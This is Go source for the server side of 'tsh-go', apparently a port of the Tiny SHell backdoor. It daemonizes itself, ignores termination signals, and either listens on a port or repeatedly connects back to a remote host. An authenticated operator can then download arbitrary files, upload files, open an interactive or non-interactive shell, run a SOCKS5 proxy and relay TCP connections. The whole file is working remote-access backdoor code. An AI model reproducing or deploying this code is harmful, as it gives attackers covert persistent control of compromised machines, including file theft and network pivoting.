package server

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"tsh-go/internal/bg"
	"tsh-go/internal/constants"
	"tsh-go/internal/pel"
	"tsh-go/internal/pty"
	"tsh-go/internal/socks5"
	"tsh-go/internal/utils"
)

func Run(secret []byte, host string, port int, delay int, runAsDaemon bool) {
	var isDaemon bool
	if os.Getenv("TSH_RUNNING_AS_DAEMON") == "1" {
		isDaemon = true
		os.Unsetenv("TSH_RUNNING_AS_DAEMON")
	}
	if runAsDaemon && !isDaemon {
		if bg.RunInBackground() != nil {
			log.Panicln("Failed to run as daemon")
			os.Exit(1)
		}
		os.Exit(0)
	}

	if runAsDaemon {
		// don't let system kill our child process after closing cmd.exe
		sigchan := make(chan os.Signal, 1)
		signal.Notify(sigchan,
			syscall.SIGINT,
			syscall.SIGTERM,
			syscall.SIGQUIT)
	}

	// apply kdf
	secret = utils.KDF(secret)

	if host == "" {
		addr := fmt.Sprintf(":%d", port)
		ln, err := pel.Listen(addr, secret, false)
		if err != nil {
			log.Println(err)
			os.Exit(1)
		}
		for {
			stream, err := ln.Accept()
			if err == nil {
				go handleGeneric(stream)
			} else {
				log.Printf("Accept failed: %v\n", err)
			}
		}
	} else {
		// connect back mode
		addr := fmt.Sprintf("%s:%d", host, port)
		for {
			stream, err := pel.Dial(addr, secret, true)
			if err == nil {
				go handleGeneric(stream)
			} else {
				log.Printf("Dial failed: %v\n", err)
			}
			time.Sleep(time.Duration(delay) * time.Second)
		}
	}
}

// entry handler,
// automatically close connection after handling
// it's safe to run with goroutine
func handleGeneric(stream utils.DuplexStreamEx) {
	defer stream.Close()
	defer func() {
		err := recover()
		if err != nil {
			log.Println(err)
		}
	}()
	buffer := make([]byte, 1)
	n, err := stream.Read(buffer)
	if err != nil || n != 1 {
		return
	}
	switch buffer[0] {
	case constants.Kill:
		os.Exit(0)
	case constants.GetFile:
		handleGetFile(stream)
	case constants.PutFile:
		handlePutFile(stream)
	case constants.RunShell:
		handleRunShell(stream)
	case constants.SOCKS5:
		handleSocks5(stream)
	case constants.Pipe:
		handlePipe(stream)
	case constants.RunShellNoTTY:
		handleRunShellNoTTY(stream)
	}
}

func handleGetFile(stream utils.DuplexStreamEx) {
	buffer := make([]byte, constants.MaxMessagesize)
	filenamebuf, err := utils.ReadVarLength(stream, buffer)
	if err != nil {
		return
	}
	filename := string(filenamebuf)
	f, err := os.Open(filename)
	if err != nil {
		return
	}
	defer f.Close()
	utils.CopyBuffer(stream, f, buffer)
	stream.Close()
}

func handlePutFile(stream utils.DuplexStreamEx) {
	buffer := make([]byte, constants.MaxMessagesize)
	destbuf, err := utils.ReadVarLength(stream, buffer)
	if err != nil {
		return
	}
	destination := filepath.FromSlash(string(destbuf))
	basenamebuf, err := utils.ReadVarLength(stream, buffer)
	if err != nil {
		return
	}
	basename := string(basenamebuf)
	if runtime.GOOS == "windows" {
		basename = strings.ReplaceAll(basename, ":", "_")
		basename = strings.ReplaceAll(basename, "\\", "_")
	}

	// if dst is a directory, save file to dst/basename
	// otherwise, save file to dst
	if fi, err := os.Stat(destination); err == nil && fi.IsDir() {
		destination = filepath.Join(destination, basename)
	}

	f, err := os.OpenFile(destination, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	utils.CopyBuffer(f, stream, buffer)
	stream.Close()
}

func handleRunShell(stream utils.DuplexStreamEx) {
	buffer1 := make([]byte, constants.MaxMessagesize)
	buffer2 := make([]byte, constants.MaxMessagesize)
	termbuf, err := utils.ReadVarLength(stream, buffer1)
	if err != nil {
		return
	}
	term := string(termbuf)

	termsize := make([]byte, 4)
	_, err = io.ReadFull(stream, termsize)
	if err != nil {
		return
	}
	ws_row := int(termsize[0])<<8 + int(termsize[1])
	ws_col := int(termsize[2])<<8 + int(termsize[3])

	cmdbuf, err := utils.ReadVarLength(stream, buffer1)
	if err != nil {
		return
	}
	command := string(cmdbuf)

	tp, err := pty.OpenPty(command, term, uint32(ws_col), uint32(ws_row))
	if err != nil {
		return
	}
	defer tp.Close()
	utils.DuplexPipe(stream, utils.DSEFromRW(tp.StdOut(), tp.StdIn()), buffer1, buffer2)
}

func handleRunShellNoTTY(stream utils.DuplexStreamEx) {
	buffer1 := make([]byte, constants.MaxMessagesize)
	cmdbuf, err := utils.ReadVarLength(stream, buffer1)
	if err != nil {
		return
	}
	command := string(cmdbuf)

	cmd := exec.Command("/bin/sh", "-c", command)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Println(err)
		return
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Println(err)
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Println(err)
		return
	}
	combinedOutput := io.MultiReader(stdout, stderr)
	go cmd.Run()
	utils.DuplexPipe(stream, utils.DSEFromRW(combinedOutput, stdin), nil, nil)
}

func handleSocks5(stream utils.DuplexStreamEx) {
	srv, _ := socks5.NewClassicServer("", "")
	srv.SupportedCommands = []byte{socks5.CmdConnect} // TODO: CmdUDP
	if err := srv.Negotiate(stream); err != nil {
		log.Println(err)
		return
	}
	req, err := srv.GetRequest(stream)
	if err != nil {
		log.Println(err)
		return
	}
	log.Println("Request type", req.Cmd)
	if req.Cmd == socks5.CmdConnect {
		conn, err := req.Connect(stream)
		if err != nil {
			stream.Close()
			log.Println(err)
			return
		}
		log.Println("Connection established", conn.RemoteAddr())
		utils.DuplexPipe(stream, conn, nil, nil)
		log.Println("Connection closed", conn.RemoteAddr())
		return
	}
}

func handlePipe(stream utils.DuplexStreamEx) {
	addrbuf, err := utils.ReadVarLength(stream, nil)
	if err != nil {
		return
	}
	addr := string(addrbuf)
	log.Println("Connecting to", addr)
	parsedAddr, err := net.ResolveTCPAddr("tcp", addr)
	if err != nil {
		return
	}
	conn, err := net.DialTCP("tcp", nil, parsedAddr)
	if err != nil {
		return
	}
	defer func() {
		conn.Close()
		log.Println("Disconnected", addr)
	}()
	utils.DuplexPipe(stream, conn, nil, nil)
}
